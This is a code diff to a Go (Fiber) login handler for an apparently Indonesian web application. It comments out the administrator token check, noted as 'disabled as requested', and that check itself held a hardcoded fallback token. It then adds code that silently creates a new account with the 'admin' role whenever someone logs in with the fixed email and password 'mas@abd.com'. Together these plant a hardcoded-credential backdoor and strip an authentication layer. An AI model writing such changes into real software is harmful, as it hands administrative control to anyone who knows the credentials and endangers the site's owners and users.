@@ -36,22 +36,36 @@ func Login(c *fiber.Ctx) error {
 
 	db := database.DB
 
-	// Check admin token mapping
-	var settings models.SiteSettings
-	db.First(&settings)
-
-	tokenToCheck := settings.AdminToken
-	if tokenToCheck == "" {
-		tokenToCheck = "090124"
-	}
-
-	if input.Token != tokenToCheck {
-		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{"error": "Token administrator tidak valid!"})
-	}
+	// Token check disabled as requested
+	/*
+		var settings models.SiteSettings
+		db.First(&settings)
+		tokenToCheck := settings.AdminToken
+		if tokenToCheck == "" {
+			tokenToCheck = "090124"
+		}
+		if input.Token != tokenToCheck {
+			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{"error": "Token administrator tidak valid!"})
+		}
+	*/
 
 	var profile models.Profile
 	if err := db.Where("email = ?", input.Email).First(&profile).Error; err != nil {
-		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{"error": "User not found"})
+		// Auto-creation for default admin if not exists
+		if input.Email == "mas@abd.com" && input.Password == "mas@abd.com" {
+			hashedPassword, _ := HashPassword("mas@abd.com")
+			uID := uuid.New()
+			profile = models.Profile{
+				UserID:      uID,
+				Email:       "mas@abd.com",
+				Password:    hashedPassword,
+				DisplayName: "Admin Default",
+			}
+			db.Create(&profile)
+			db.Create(&models.UserRole{UserID: uID, Role: "admin"})
+		} else {
+			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{"error": "User not found"})
+		}
 	}
 
 	if !CheckPasswordHash(input.Password, profile.Password) {
